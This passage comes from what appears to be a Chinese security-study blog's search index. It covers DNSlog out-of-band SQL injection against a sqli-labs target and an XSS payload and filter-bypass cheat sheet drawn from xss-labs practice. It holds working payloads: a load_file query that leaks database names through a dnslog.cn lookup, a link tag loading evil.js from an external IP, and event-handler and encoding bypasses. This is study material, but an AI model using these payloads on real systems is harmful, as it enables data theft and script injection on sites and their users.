网络路径</p>\n<p>win+e打开文件资源管理器，</p>\n<p>在上面的路径栏输入</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">//www.baidu.com/<br></code></pre></td></tr></table></figure>\n\n<p>你就会发现，</p>\n<p>电脑自动帮你打开了百度这个网址，</p>\n<p>那么load_file这个函数同样可以访问这么一个网络路径，</p>\n<p>我们就可以通过这来手动注入了</p>\n</li>\n</ol>\n<h1 id=\"2-DNSlog-手动注入\"><a href=\"#2-DNSlog-手动注入\" class=\"headerlink\" title=\"2 DNSlog 手动注入\"></a>2 DNSlog 手动注入</h1><p>需要的网址</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">www.dnslog.cn<br></code></pre></td></tr></table></figure>\n\n<p>然后就是按照你申请的域名构造语句</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=1&#x27; and load_file(concat(&#x27;//&#x27;,database(),&#x27;.&#x27;,&#x27;c3swhm.dnslog.cn/abc.txt&#x27;)) --+<br></code></pre></td></tr></table></figure>\n\n<p>然后后面一步步我就不做了，</p>\n<p>注意使用limit关键字来获取第n行的数据，</p>\n<p>不要使用group_concat()，</p>\n<p>不会有访问结果</p>\n<p>笔记：</p>\n\n\n<h1 id=\"3-DNSlog-自动注入\"><a href=\"#3-DNSlog-自动注入\" class=\"headerlink\" title=\"3 DNSlog 自动注入\"></a>3 DNSlog 自动注入</h1><p>需要用到的工具</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">https://github.com/ADOOO/DnsLogSqlinj<br></code></pre></td></tr></table></figure>\n\n<p>别忘了装python环境然后pip一下库</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">pip install gevent==1.2.2<br>pip install termcolor<br></code></pre></td></tr></table></figure>\n\n<p>啊完了。。。。。要linux才可以。。。。</p>\n<p>windows下报错</p>\n\n\n<p>这个报错不用抢救了一看就是系统的问题。。。</p>\n<p>好吧，</p>\n<p>掏出我的kali虚拟机！！！[中二]</p>\n\n\n<p>我的pip呢？？？？？</p>\n<p>【此处省略漫长的解决过程…….】</p>\n\n\n<p>终于好了。。。。</p>\n<p>现在输入命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">python dnslogSql.py -u &quot;http://192.168.1.26/Less-9/?id=1&#x27; and (&#123;&#125;) --+&quot; --dbs<br></code></pre></td></tr></table></figure>\n\n<p>这其实和sqlmap差不多，</p>\n<p>我之前入门的时候就是用的sqlmap拿下的第一个靶场哈哈哈</p>\n<p>然后输入后就会在dnslog后台看到</p>\n\n\n<p>说明有6个数据库</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">mysql&gt; show databases;<br>+--------------------+<br>| Database           |<br>+--------------------+<br>| information_schema |<br>| challenges         |<br>| mysql              |<br>| performance_schema |<br>| security           |<br>| sys                |<br>+--------------------+<br>6 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure>\n\n<p>确实是6个数据库</p>\n<p>然后后面一步步我就不干了，</p>\n\n\n<p>泰裤辣</p>\n<h1 id=\"4-最后\"><a href=\"#4-最后\" class=\"headerlink\" title=\"4 最后\"></a>4 最后</h1><p>今天的这个与其说是教我们新函数吧，</p>\n<p>其实就是给我们一个函数利用的思路，</p>\n<p>这样我们举一反三就会效率更高！</p>\n<p>关闭我心爱的小kali，</p>\n<p>hexo g</p>\n<p>hexo d</p>\n<p>结束！</p>\n","categories":["SQL_Study"],"tags":["sql"]},{"title":"Xss注入总结","url":"/2023/07/04/Xss%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/","content":"<p>这篇文章针对前面的xss payload、xss注入绕过进行一个梳理总结</p>\n<span id=\"more\"></span>\n\n<p>在前面的文章中已经打靶并且成功通关了xss-labs这个靶场，小有心得，正好昨天看到了一位师傅的文章，结合自己的陋见，作一个总结吧</p>\n<h1 id=\"普通标签-x2F-payload\"><a href=\"#普通标签-x2F-payload\" class=\"headerlink\" title=\"普通标签&#x2F;payload\"></a>普通标签&#x2F;payload</h1><p>github上面有一些字典：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">https://github.com/payloadbox/xss-payload-list/tree/master/Intruder<br>https://github.com/pgaijin66/XSS-Payloads<br></code></pre></td></tr></table></figure>\n\n<p>上面的比较杂，单纯用于字典爆破，有时候可能我们知道了他过滤哪些标签，我们想要知道有哪些其他的标签没有被过滤的，接下来作一个payload汇总：</p>\n<p><code>&lt;script&gt;</code></p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">scirpt</span>&gt;</span>alert(&quot;xss&quot;)<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">scirpt</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"img-标签\"><a href=\"#img-标签\" class=\"headerlink\" title=\"img 标签\"></a>img 标签</h2><p><code>&lt;img&gt;</code> 标签定义 HTML 页面中的图像。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\">图片加载错误时触发<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;x&quot;</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">alert(1)</span>&gt;</span> <br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;1&quot;</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">eval(</span>&quot;<span class=\"hljs-attr\">alert</span>(&#x27;<span class=\"hljs-attr\">xss</span>&#x27;)&quot;)&gt;</span><br>鼠标指针移动到元素时触发 <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">1</span> <span class=\"hljs-attr\">onmouseover</span>=<span class=\"hljs-string\">&quot;alert(1)&quot;</span>&gt;</span><br>鼠标指针移出时触发 <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">1</span> <span class=\"hljs-attr\">onmouseout</span>=<span class=\"hljs-string\">&quot;alert(1)&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"input-标签\"><a href=\"#input-标签\" class=\"headerlink\" title=\"input 标签\"></a>input 标签</h2><p><code>&lt;input&gt;</code> 标签规定了用户可以在其中输入数据的输入字段。</p>\n<p>onfocus 事件在对象获得焦点时发生：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">onfocus</span>=<span class=\"hljs-string\">alert(1);</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>竞争焦点，从而触发onblur事件：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">onblur</span>=<span class=\"hljs-string\">alert(1)</span> <span class=\"hljs-attr\">autofocus</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">autofocus</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>input 标签的 autofocus 属性规定当页面加载时 <code>&lt;input&gt;</code> 元素应该自动获得焦点。可以通过autofocus属性自动执行本身的focus事件，这个向量是使焦点自动跳到输入元素上，触发焦点事件，无需用户去触发：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">onfocus</span>=<span class=\"hljs-string\">&quot;alert(1);&quot;</span> <span class=\"hljs-attr\">autofocus</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>扩展：</p>\n<blockquote>\n<p>按下按键时触发 <code>&lt;input type=&quot;text&quot; onkeydown=&quot;alert(1)&quot;&gt;</code> </p>\n<p>按下按键时触发 <code>&lt;input type=&quot;text&quot; onkeypress=&quot;alert(1)&quot;&gt;</code> </p>\n<p>松开按键式时触发 <code>&lt;input type=&quot;text&quot; onkeyup=&quot;alert(1)&quot;&gt;</code> </p>\n</blockquote>\n<h2 id=\"details-标签\"><a href=\"#details-标签\" class=\"headerlink\" title=\"details 标签\"></a>details 标签</h2><p><code>&lt;details&gt;</code> 标签通过提供用户开启关闭的交互式控件，规定了用户可见的或者隐藏的需求的补充细节。ontoggle 事件规定了在用户打开或关闭 <code>&lt;details&gt;</code> 元素时触发：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">details</span> <span class=\"hljs-attr\">ontoggle</span>=<span class=\"hljs-string\">alert(1);</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>使用details 标签的 open 属性触发ontoggle事件，无需用户去点击即可触发：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">details</span> <span class=\"hljs-attr\">open</span> <span class=\"hljs-attr\">ontoggle</span>=<span class=\"hljs-string\">alert(1);</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"svg-标签\"><a href=\"#svg-标签\" class=\"headerlink\" title=\"svg 标签\"></a>svg 标签</h2><p><code>&lt;svg&gt;</code> 标签用来在HTML页面中直接嵌入SVG 文件的代码。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">svg</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">alert(1);</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"select-标签\"><a href=\"#select-标签\" class=\"headerlink\" title=\"select 标签\"></a>select 标签</h2><p><code>&lt;select&gt;</code> 标签用来创建下拉列表。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">select</span> <span class=\"hljs-attr\">onfocus</span>=<span class=\"hljs-string\">alert(1)</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">select</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>通过autofocus属性规定当页面加载时元素应该自动获得焦点，这个向量是使焦点自动跳到输入元素上，触发焦点事件，无需用户去触发：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">select</span> <span class=\"hljs-attr\">onfocus</span>=<span class=\"hljs-string\">alert(1)</span> <span class=\"hljs-attr\">autofocus</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"iframe-标签\"><a href=\"#iframe-标签\" class=\"headerlink\" title=\"iframe 标签\"></a>iframe 标签</h2><p><code>&lt;iframe&gt;</code> 标签会创建包含另外一个文档的内联框架。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">iframe</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">alert(1);</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">iframe</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>扩展：</p>\n<blockquote>\n<p><code>&lt;iframe src=javascript:alert(&#39;xss&#39;)&gt;&lt;/iframe&gt;</code><br><code>&lt;iframe src=&quot;data:text/html,&amp;lt;script&amp;gt;alert(&#39;xss&#39;)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;</code><br><code>&lt;iframe src=&quot;data:text/html;base64,&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;&gt;</code><br><code>&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;</code><br><code>&lt;iframe src=&quot;aaa&quot; onmouseover=alert(&#39;xss&#39;) /&gt;&lt;iframe&gt;</code></p>\n</blockquote>\n<h2 id=\"video-标签\"><a href=\"#video-标签\" class=\"headerlink\" title=\"video 标签\"></a>video 标签</h2><p><code>&lt;video&gt;</code> 标签定义视频，比如电影片段或其他视频流。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">video</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">source</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">alert(1)</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"audio-标签\"><a href=\"#audio-标签\" class=\"headerlink\" title=\"audio 标签\"></a>audio 标签</h2><p><code>&lt;audio&gt;</code> 标签定义声音，比如音乐或其他音频流。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">audio</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">x</span>  <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">alert(1);</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"body-标签\"><a href=\"#body-标签\" class=\"headerlink\" title=\"body 标签\"></a>body 标签</h2><p><code>&lt;body&gt;</code> 标签定义文档的主体。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">body</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">alert(1);</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>onscroll 事件在元素滚动条在滚动时触发。我们可以利用换行符以及autofocus，当用户滑动滚动条的时候自动触发，无需用户去点击触发：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">body</span></span><br><span class=\"hljs-tag\"><span class=\"hljs-attr\">onscroll</span>=<span class=\"hljs-string\">alert(1);</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">autofocus</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"textarea-标签\"><a href=\"#textarea-标签\" class=\"headerlink\" title=\"textarea 标签\"></a>textarea 标签</h2><p><code>&lt;textarea&gt;</code> 标签定义一个多行的文本输入控件。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">textarea</span> <span class=\"hljs-attr\">onfocus</span>=<span class=\"hljs-string\">alert(1);</span> <span class=\"hljs-attr\">autofocus</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"keygen-标签\"><a href=\"#keygen-标签\" class=\"headerlink\" title=\"keygen 标签\"></a>keygen 标签</h2><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">keygen</span> <span class=\"hljs-attr\">autofocus</span> <span class=\"hljs-attr\">onfocus</span>=<span class=\"hljs-string\">alert(1)</span>&gt;</span> //仅限火狐<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"marquee-标签\"><a href=\"#marquee-标签\" class=\"headerlink\" title=\"marquee 标签\"></a>marquee 标签</h2><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">marquee</span> <span class=\"hljs-attr\">onstart</span>=<span class=\"hljs-string\">alert(1)</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">marquee</span>&gt;</span> //Chrome不行，火狐和IE都可以<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"isindex-标签\"><a href=\"#isindex-标签\" class=\"headerlink\" title=\"isindex 标签\"></a>isindex 标签</h2><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">isindex</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">image</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">1</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">alert(1)</span>&gt;</span>//仅限于IE<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"link-标签\"><a href=\"#link-标签\" class=\"headerlink\" title=\"link 标签\"></a>link 标签</h2><p><code>&lt;link&gt;</code> 标签定义文档与外部资源的关系。在无CSP的情况下才可以使用：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">import</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">&quot;http://47.xxx.xxx.72/evil.js&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<hr>\n<p>这个payload有点rfi那感觉了</p>\n<h2 id=\"a-标签\"><a href=\"#a-标签\" class=\"headerlink\" title=\"a 标签\"></a>a 标签</h2><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">&quot;javascript:alert(1);&quot;</span>&gt;</span>xss<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"iframe-标签-1\"><a href=\"#iframe-标签-1\" class=\"headerlink\" title=\"iframe 标签\"></a>iframe 标签</h2><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">iframe</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">javascript:alert(1);</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">iframe</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"form-标签\"><a href=\"#form-标签\" class=\"headerlink\" title=\"form 标签\"></a>form 标签</h2><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">form</span> <span class=\"hljs-attr\">action</span>=<span class=\"hljs-string\">&quot;Javascript:alert(1)&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">submit</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h1 id=\"bypass-payload\"><a href=\"#bypass-payload\" class=\"headerlink\" title=\"bypass payload\"></a>bypass payload</h1><h2 id=\"绕过空格过滤\"><a href=\"#绕过空格过滤\" class=\"headerlink\" title=\"绕过空格过滤\"></a>绕过空格过滤</h2><p>当空格被过滤了时，我们可以用 <code>/</code> 来代替空格：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\">&lt;img/src=&quot;x&quot;/onerror=alert(1);&gt;<br></code></pre></td></tr></table></figure>\n\n<p>也可以：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\">&lt;img/src=&quot;x&quot;onerror=alert(1);&gt;<br></code></pre></td></tr></table></figure>\n\n<p>当然还可以使用url编码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">%20, %09, %0a, %0b, %0c, %0d, %a0<br></code></pre></td></tr></table></figure>\n\n<p>来替换空格</p>\n<h2 id=\"绕过引号过滤\"><a href=\"#绕过引号过滤\" class=\"headerlink\" title=\"绕过引号过滤\"></a>绕过引号过滤</h2><p>如果是html标签中，我们可以不用引号。如果是在js中，我们可以用反引号代替单双引号：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">x</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">alert(</span>`<span class=\"hljs-attr\">xss</span>`);&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"绕过括号过滤\"><a href=\"#绕过括号过滤\" class=\"headerlink\" title=\"绕过括号过滤\"></a>绕过括号过滤</h2><p>当括号被过滤的时候可以使用throw来绕过。throw 语句用于当错误发生时抛出一个错误。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">x</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">&quot;javascript:window.onerror=alert;throw 1&quot;</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span> <span class=\"hljs-attr\">onmouseover</span>=<span class=\"hljs-string\">&quot;javascript:window.onerror=alert;throw 1&gt;</span></span><br></code></pre></td></tr></table></figure>\n\n<hr>\n<p>2023&#x2F;8&#x2F;20发现新姿势：<strong>反引号代替括号</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">alert`1`<br></code></pre></td></tr></table></figure>\n\n<p>同样弹窗！</p>\n<h2 id=\"绕过关键字过滤\"><a href=\"#绕过关键字过滤\" class=\"headerlink\" title=\"绕过关键字过滤\"></a>绕过关键字过滤</h2><h3 id=\"大小写绕过\"><a href=\"#大小写绕过\" class=\"headerlink\" title=\"大小写绕过\"></a>大小写绕过</h3><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">sCRiPt</span>&gt;</span>alert(1);<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">sCrIpT</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">ImG</span> <span class=\"hljs-attr\">sRc</span>=<span class=\"hljs-string\">x</span> <span class=\"hljs-attr\">onerRor</span>=<span class=\"hljs-string\">alert(1);</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"双写绕过\"><a href=\"#双写绕过\" class=\"headerlink\" title=\"双写绕过\"></a>双写绕过</h3><p>有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">scrscriptipt</span>&gt;</span>alert(1);<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">scrscriptipt</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">imimgg</span> <span class=\"hljs-attr\">srsrcc</span>=<span class=\"hljs-string\">x</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">alert(1);</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"字符串拼接绕过\"><a href=\"#字符串拼接绕过\" class=\"headerlink\" title=\"字符串拼接绕过\"></a>字符串拼接绕过</h3><h4 id=\"利用eval-函数\"><a href=\"#利用eval-函数\" class=\"headerlink\" title=\"利用eval()函数\"></a>利用eval()函数</h4><p>与PHP的eval()函数相同，JavaScript的eval()函数也可以计算 JavaScript 字符串，并把它作为脚本代码来执行。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;x&quot;</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">&quot;a=&#x27;aler&#x27;;b=&#x27;t&#x27;;c=&#x27;(1)&#x27;;eval(a+b+c)&quot;</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">img</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;x&quot;</span> <span class=\"hljs-attr\">onerror</span>=<span class=\"hljs-string\">&quot;a=`aler`;b=`t`;c=&#x27;(`xss`);&#x27;;eval(a+b+c)&quot;</span>&gt;</span><br>// 在js中，我们可以用反引号代替单双引号<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"利用top\"><a href=\"#利用top\" class=\"headerlink\" title=\"利用top\"></a>利用top</h4><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\">top[<span class=\"hljs-string\">&quot;al&quot;</span>+<span class=\"hljs-string\">&quot;ert&quot;</span>](<span class=\"hljs-string\">`xss`</span>);</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\">top[<span class=\"hljs-string\">&quot;al&quot;</span>+<span class=\"hljs-string\">&quot;ert&quot;</span>](<span class=\"hljs-string\">&quot;xss&quot;</span>);</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"标签特性绕过\"><a href=\"#标签特性绕过\" class=\"headerlink\" title=\"标签特性绕过\"></a>标签特性绕过</h3><p>终于有我插得上话的地方了。。。。在xss-labs里面有一道，对a href标签中的javascript字符串作了过滤，那一关的解题方法是利用a href自动unicode解码的特性绕过</p>\n<p>我们可以将</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\">javascript:alert()<br></code></pre></td></tr></table></figure>\n\n<p>编码成</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code 